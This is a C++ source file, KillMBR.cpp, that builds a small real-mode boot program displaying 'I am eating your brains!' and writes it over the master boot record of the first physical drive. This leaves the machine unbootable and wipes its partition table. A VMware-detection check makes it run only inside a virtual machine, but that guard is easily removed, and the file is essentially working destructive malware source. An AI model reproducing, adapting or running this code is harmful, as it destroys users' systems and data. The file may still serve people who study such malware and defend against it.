// Need platform SDK for WinXP/2K3.
// e.g. cl /IC:\PSDK\Include KillMBR.cpp
#include <windows.h>

#pragma comment(lib, "user32.lib")

void SelfDump(void *dest)
{
	unsigned char *start;
	unsigned char *end;

	__asm
	{
		jmp DumpEnd

DumpStart:

//////////////////////////////////////////////////////////////////////////
///////////////// The following code will be dumped //////////////////////
//////////////////////////////////////////////////////////////////////////

		// Set video mode: int 10h.

		mov ax, 12h // AL = mode.
		int 10h

		// MBR code is loaded at 0000:007c.
		// The string's offset = 18h.
		// So BP = 7c18h.
		mov bp, 7c18h
		mov cx, 0018h // String length.
		mov ax, 1301h // AL = mode.
		mov bx, 0007h // BH = display page number, BL = color.
		mov dx, 0e1dh // DH = row, DL = column.
		int 10h

DeadLoop:
		loop DeadLoop

		// String to display.
		_emit 'I'
		_emit ' '
		_emit 'a'
		_emit 'm'
		_emit ' '
		_emit 'e'
		_emit 'a'
		_emit 't'
		_emit 'i'
		_emit 'n'
		_emit 'g'
		_emit ' '
		_emit 'y'
		_emit 'o'
		_emit 'u'
		_emit 'r'
		_emit ' '
		_emit 'b'
		_emit 'r'
		_emit 'a'
		_emit 'i'
		_emit 'n'
		_emit 's'
		_emit '!'

//////////////////////////////////////////////////////////////////////////
//////////////////// The above code will be dumped ///////////////////////
//////////////////////////////////////////////////////////////////////////

DumpEnd:
		lea eax, DumpStart
		mov dword ptr [start], eax
		lea eax, DumpEnd
		mov dword ptr [end], eax
	}

	// Copy the code to dest.
	unsigned char *p = (unsigned char *)dest;
	while (start != end)
	{
		// 0x66 is prefix for 32-bit instructions.
		// It should be ignored in real mode.
		if (*start == 0x66)
		{
			start++;
		}
		else
		{
			*p++ = *start++;
		}
	}
}

bool KillMBR()
{
	// Rebuild MBR.
	static BYTE pMBR[512];
	SelfDump(pMBR);

	// Signature of bootloader.
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;

	// Open HD.
	HANDLE hDevice = CreateFile(
		"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
		return false;

	// Lock HD.
	DWORD dwBytesReturned;
	DeviceIoControl(
		hDevice, 
		FSCTL_LOCK_VOLUME, 
		NULL, 
		0, 
		NULL, 
		0, 
		&dwBytesReturned, 
		NULL
	);

	// Write dumped code into MBR.
	DWORD dwBytesWritten;
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);

	// Unlock HD.
	DeviceIoControl(
		hDevice, 
		FSCTL_UNLOCK_VOLUME, 
		NULL, 
		0, 
		NULL, 
		0, 
		&dwBytesReturned, 
		NULL
	);

	// Close HD.
	CloseHandle(hDevice);

	return true;
}

bool IsInsideVMWare()
{
	bool rc = true;

	__try
	{
		__asm
		{
			push edx
			push ecx
			push ebx
			
			mov eax, 'VMXh'
			mov ebx, 0	// any value but not the MAGIC VALUE
			mov ecx, 10	// get VMWare version
			mov edx, 'VX'	// port number
			
			// on return EAX returns the VERSION
			in eax, dx	// read port
			
			cmp ebx, 'VMXh' // is it a reply from VMWare?
			setz [rc]	// set return value
			
			pop ebx
			pop ecx
			pop edx
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		rc = false;
	}
	
	return rc;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Protect against destroying real machine.
	if (!IsInsideVMWare())
	{
		MessageBox(
			NULL, 
			"Killing MBR is cancelled under real machine!", 
			"KillMBR", 
			MB_ICONWARNING
		);
	}
	else
	{
		KillMBR();
	}

	return 0;
}

